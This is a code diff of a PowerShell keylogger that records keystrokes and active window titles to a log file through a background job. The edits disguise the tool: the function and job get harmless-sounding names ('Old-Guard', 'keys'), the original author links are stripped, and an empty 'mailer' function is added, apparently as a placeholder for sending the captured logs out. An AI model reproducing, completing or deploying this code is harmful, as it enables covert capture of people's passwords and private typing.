@@ -1,4 +1,4 @@
-function Young-Guard {
+function Old-Guard {
 <#
 .SYNOPSIS
  
@@ -22,9 +22,7 @@ function Young-Guard {
     Get-Keystrokes -CollectionInterval 20
 .EXAMPLE
     Get-Keystrokes -PollingInterval 35
-.LINK
-    http://www.obscuresec.com/
-    http://www.exploit-monday.com/
+
 #>
     [CmdletBinding()] Param (
         [Parameter(Position = 0)]
@@ -165,12 +163,6 @@ function Young-Guard {
                             $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                             $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                             $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
-                            $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
-                            $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
-                            $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
-                            $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
-                            $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
-                            $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
 
                             if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
                             if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
@@ -180,12 +172,6 @@ function Young-Guard {
                             if ($DeleteKey)    {$LogOutput += '[Delete]'}
                             if ($EnterKey)     {$LogOutput += '[Enter]'}
                             if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
-                            if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
-                            if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
-                            if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
-                            if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
-                            if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
-                            if ($RightMouse)   {$LogOutput += '[Right Mouse]'}
 
                             #check for capslock
                             if ([Console]::CapsLock) {$LogOutput += '[Caps Lock]'}
@@ -209,7 +195,7 @@ function Young-Guard {
                             $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
 
                             #get the current DTG
-                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+                            $TimeStamp = (Get-Date -Format dd/MM:HH:mm)
 
                             #Create a custom object to store results
                             $ObjectProperties = @{'Key Typed' = $LogOutput;
@@ -217,7 +203,7 @@ function Young-Guard {
                                                   'Window Title' = $WindowTitle}
                             $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
 
-                            # Stupid hack since Export-CSV doesn't have an append switch in PSv2
+                            # Export-CSV doesn't have an append switch in PSv2
                             $CSVEntry = ($ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
 
                             #return results
@@ -230,17 +216,23 @@ function Young-Guard {
                 catch {}
             }
         }
+        
+    function mailer {
+    
+    
+    
+    }
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name keys | Out-Null
 
     if ($PSBoundParameters['CollectionInterval'])
     {
         $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)
 
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
-            Stop-Job -Name Keylogger
+            Stop-Job -Name keys
             Unregister-Event -SourceIdentifier ElapsedAction
 
             $Sender.Stop()
